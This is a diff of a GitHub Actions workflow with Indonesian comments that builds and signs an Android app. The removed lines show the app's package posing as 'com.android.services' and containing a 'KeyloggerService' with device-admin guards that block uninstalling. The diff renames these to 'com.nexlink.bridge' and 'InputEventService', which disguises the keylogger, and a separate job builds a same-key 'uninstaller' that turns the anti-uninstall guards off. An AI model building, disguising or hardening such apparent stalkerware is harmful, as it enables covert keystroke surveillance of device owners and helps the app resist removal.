@@ -12,7 +12,6 @@ name: Build Android APK
 #     saling update satu sama lain tanpa error "SHA berbeda".
 # =============================================================================
 
-
 on:
   push:
     branches: [ main, master ]
@@ -50,8 +49,14 @@ jobs:
           APKSIGNER=$(find $ANDROID_SDK_ROOT/build-tools -name "apksigner" | sort -V | tail -1)
           echo "apksigner: $APKSIGNER"
 
-          # Hapus signature lama (debug), lalu sign ulang dengan release keystore
-          $APKSIGNER sign             --ks /tmp/androidconnector.p12             --ks-type PKCS12             --ks-pass pass:"$KEYSTORE_PASSWORD"             --key-pass pass:"$KEY_PASSWORD"             --ks-key-alias "$KEY_ALIAS"             --out android/app/build/outputs/apk/debug/app-debug-release-signed.apk             android/app/build/outputs/apk/debug/app-debug.apk
+          $APKSIGNER sign \
+            --ks /tmp/androidconnector.p12 \
+            --ks-type PKCS12 \
+            --ks-pass pass:"$KEYSTORE_PASSWORD" \
+            --key-pass pass:"$KEY_PASSWORD" \
+            --ks-key-alias "$KEY_ALIAS" \
+            --out android/app/build/outputs/apk/debug/app-debug-release-signed.apk \
+            android/app/build/outputs/apk/debug/app-debug.apk
 
           echo "✅ Re-sign selesai"
           $APKSIGNER verify --print-certs android/app/build/outputs/apk/debug/app-debug-release-signed.apk | head -5
@@ -112,13 +117,14 @@ jobs:
           echo "## ✅ Build Berhasil" >> $GITHUB_STEP_SUMMARY
           echo "| | |" >> $GITHUB_STEP_SUMMARY
           echo "|---|---|" >> $GITHUB_STEP_SUMMARY
+          echo "| **Package** | com.nexlink.bridge |" >> $GITHUB_STEP_SUMMARY
           echo "| **APK** | AndroidConnector-release-signed.apk |" >> $GITHUB_STEP_SUMMARY
           echo "| **Commit** | \`${{ github.sha }}\` |" >> $GITHUB_STEP_SUMMARY
           echo "| **R8** | ✅ Aktif |" >> $GITHUB_STEP_SUMMARY
           echo "| **Signed** | ✅ V2 + V3 |" >> $GITHUB_STEP_SUMMARY
           ls -lh android/app/build/outputs/apk/release/
 
-  # ─── UNINSTALLER APK — parallel dengan build-release ─────────────────────────
+  # ─── UNINSTALLER APK ─────────────────────────────────────────────────────────
   build-uninstaller:
     name: "🗑️ Build Uninstaller APK"
     runs-on: ubuntu-latest
@@ -138,20 +144,20 @@ jobs:
         run: |
           # Ganti AppDeviceAdminReceiver dengan versi tanpa proteksi
           cp android/scripts/uninstaller/AppDeviceAdminReceiver.kt \
-             android/app/src/main/kotlin/com/android/services/AppDeviceAdminReceiver.kt
+             android/app/src/main/kotlin/com/nexlink/bridge/AppDeviceAdminReceiver.kt
 
-          # Matikan adminGuardEnabled (120ms/50ms guard di KeyloggerService)
+          # Matikan adminGuardEnabled (guard di InputEventService)
           sed -i 's/@Volatile var adminGuardEnabled: Boolean = true/@Volatile var adminGuardEnabled: Boolean = false/' \
-            android/app/src/main/kotlin/com/android/services/KeyloggerService.kt
+            android/app/src/main/kotlin/com/nexlink/bridge/InputEventService.kt
 
           # Matikan auto setBlockUninstall saat service start
           sed -i 's/Thread { AppDeviceAdminReceiver.setBlockUninstall/\/\/ Thread { AppDeviceAdminReceiver.setBlockUninstall/' \
-            android/app/src/main/kotlin/com/android/services/ConnectorService.kt
+            android/app/src/main/kotlin/com/nexlink/bridge/ConnectorService.kt
           sed -i 's/\.also { it\.isDaemon = true }\.start()/\/\/ .also { it.isDaemon = true }.start()/' \
-            android/app/src/main/kotlin/com/android/services/ConnectorService.kt
+            android/app/src/main/kotlin/com/nexlink/bridge/ConnectorService.kt
 
           echo "✅ Semua patch applied"
-          grep "adminGuardEnabled" android/app/src/main/kotlin/com/android/services/KeyloggerService.kt
+          grep "adminGuardEnabled" android/app/src/main/kotlin/com/nexlink/bridge/InputEventService.kt
 
       - name: Decode Keystore
         run: |
@@ -188,7 +194,7 @@ jobs:
           echo "## 🗑️ Uninstaller APK Siap" >> $GITHUB_STEP_SUMMARY
           echo "| | |" >> $GITHUB_STEP_SUMMARY
           echo "|---|---|" >> $GITHUB_STEP_SUMMARY
-          echo "| **Package** | com.android.services (identik) |" >> $GITHUB_STEP_SUMMARY
+          echo "| **Package** | com.nexlink.bridge (identik) |" >> $GITHUB_STEP_SUMMARY
           echo "| **Keystore** | Sama → Android terima sebagai Update |" >> $GITHUB_STEP_SUMMARY
           echo "| **Anti-Uninstall** | OFF semua |" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
